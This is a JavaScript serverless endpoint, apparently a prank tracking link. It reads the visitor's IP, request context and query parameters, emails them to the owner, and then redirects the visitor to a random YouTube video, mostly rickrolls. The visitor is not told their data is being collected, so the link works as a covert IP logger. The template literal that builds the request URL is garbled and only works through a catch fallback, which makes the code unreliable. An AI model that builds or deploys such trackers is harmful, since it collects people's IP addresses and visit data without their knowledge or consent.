// api/index.js
require('dotenv').config();
const { getVisitContext, isPrivateIP, shouldSendForIp } = require('../lib/utils');
const { sendVisitEmail } = require('../lib/email');

const YOUTUBE_VIDEOS = [
  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  'https://www.youtube.com/watch?v=9bZkp7q19f0',
  'https://www.youtube.com/watch?v=kJQP7kiw5Fk',
  'https://www.youtube.com/watch?v=OPf0YbXqDm0',
  'https://www.youtube.com/watch?v=CevxZvSJLk8',
  'https://www.youtube.com/watch?v=kffacxfA7G4',
  'https://www.youtube.com/watch?v=MtN1YnoL46Q',
  'https://www.youtube.com/watch?v=j5a0jTc9S10',
];

module.exports = async (req, res) => {
  // دعم HEAD requests (للـ health checks)
  if (req.method === 'HEAD') {
    res.statusCode = 200;
    return res.end();
  }

  if (req.method !== 'GET') {
    res.statusCode = 405;
    return res.end('Method Not Allowed');
  }

  const ctx = getVisitContext(req);

  // استخراج query params بطريقة مثالية ومضمونة
  let qp;
  try {
    const proto = req.headers['x-forwarded-proto']?.split(',')[0].trim() || 'https';
    const host = req.headers.host || 'localhost:3000';
    const fullUrl = `\( {proto}:// \){host}${req.url}`;
    qp = new URL(fullUrl).searchParams;
  } catch {
    qp = new URLSearchParams(req.url.split('?')[1] || '');
  }

  const payload = {
    utm: {
      source: qp.get('utm_source'),
      medium: qp.get('utm_medium'),
      campaign: qp.get('utm_campaign'),
      term: qp.get('utm_term'),
      content: qp.get('utm_content'),
    },
    userId: qp.get('userId'),
    sessionId: qp.get('sessionId'),
  };

  const ip = ctx.clientIP;

  // إرسال الإيميل (مع throttle)
  if (shouldSendForIp(ip) && process.env.EMAIL_TO && process.env.EMAIL_USER && process.env.EMAIL_APP_PASSWORD) {
    try {
      await sendVisitEmail({ payload, context: ctx });
      console.log(`[EMAIL] تم الإرسال بنجاح إلى ${ip}`);
    } catch (err) {
      console.error('[EMAIL] فشل الإرسال لكن مكملين:', err.message);
    }
  }

  // ريدايركت عشوائي
  const randomVideo = YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];

  res.statusCode = 302;
  res.setHeader('Location', randomVideo);
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('X-Rick-Rolled', 'Never gonna give you up');
  res.end();
};